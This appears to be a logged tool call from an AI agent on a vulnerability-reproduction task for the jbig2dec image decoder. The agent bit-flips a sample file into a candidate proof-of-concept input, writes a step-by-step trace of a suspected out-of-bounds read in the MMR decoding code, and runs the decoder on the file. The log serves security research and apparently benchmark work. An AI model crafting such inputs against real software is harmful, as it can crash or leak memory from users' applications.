message:
Command `cd /workspace/repo-vul/work-vul/jbig2dec && python3 - <<'PY'
from pathlib import Path
# small targeted mutation around header and first segments
b=bytearray(Path('../../src-vul/jbig2dec/annex-h.jbig2').read_bytes())
for i in range(16, min(len(b), 160)):
    if i % 11 == 0:
        b[i] ^= 0x01
    elif i % 13 == 0:
        b[i] ^= 0x80
Path('/workspace/poc.bin').write_bytes(b)
trace=[
{"step":1,"file":"jbig2.c","function":"jbig2_data_in","line":275,"var":"ctx->buf + ctx->buf_rd_ix","code":"if (memcmp(ctx->buf + ctx->buf_rd_ix, jbig2_id_string, 8)) return jbig2_error(ctx, JBIG2_SEVERITY_FATAL, -1, \"not a JBIG2 file header\");","note":"The input keeps the JBIG2 magic bytes so the parser accepts the file."},
{"step":2,"file":"jbig2_symbol_dict.c","function":"jbig2_symbol_dictionary","line":694,"var":"BMSIZE","code":"code = jbig2_decode_generic_mmr(ctx, segment, &rparams, data + jbig2_huffman_offset(hs), BMSIZE, image);","note":"The crafted symbol dictionary steers the parser into MMR bitmap decoding with a byte count derived from the stream."},
{"step":3,"file":"jbig2_mmr.c","function":"jbig2_decode_mmr_init","line":71,"var":"mmr->size","code":"mmr->size = size;","note":"The MMR decoder records the provided remaining byte count as its buffer limit."},
{"step":4,"file":"jbig2_mmr.c","function":"jbig2_decode_mmr_consume","line":86,"var":"mmr->data[mmr->data_index + 4]","code":"if (mmr->data_index + 4 < mmr->size) mmr->word |= (mmr->data[mmr->data_index + 4] << mmr->bit_index);","note":"Near the end of the encoded stream, refills stop reading new bytes from the buffer."},
{"step":5,"file":"jbig2_mmr.c","function":"jbig2_decode_mmr_consume","line":88,"var":"mmr->data_index","code":"mmr->data_index++;","note":"The internal cursor still increments even when the lookahead byte was not fetched."},
{"step":6,"file":"jbig2_mmr.c","function":"jbig2_decode_generic_mmr","line":1147,"var":"*consumed_bytes","code":"*consumed_bytes += mmr.data_index + (mmr.bit_index >> 3) + (mmr.bit_index > 0 ? 1 : 0);","note":"The inflated cursor is reported back as consumed bytes to the caller."},
{"step":7,"file":"jbig2_symbol_dict.c","function":"jbig2_symbol_dictionary","line":702,"var":"jbig2_huffman_advance(hs, BMSIZE)","code":"code = jbig2_huffman_advance(hs, BMSIZE);","note":"The caller advances the Huffman stream by the bitmap size after MMR decoding, so an inflated consumed count can desynchronize the remaining input position."},
{"step":8,"file":"jbig2_mmr.c","function":"jbig2_decode_mmr_line","line":874,"var":"mmr->word","code":"white_run = jbig2_decode_get_run(ctx, mmr, jbig2_mmr_white_decode, 8);","note":"Later decoding uses the stale MMR word buffer and can read outside the intended encoded input buffer."}
]
Path('/workspace/candidate_trace.json').write_text(__import__('json').dumps(trace, ensure_ascii=False, indent=2))
PY
LD_LIBRARY_PATH=.libs ./.libs/jbig2dec -q -o /dev/null /workspace/poc.bin >/tmp/run.log 2>&1; ec=$?; echo EXIT:$ec; tail -20 /tmp/run.log` executed with exit code 0.
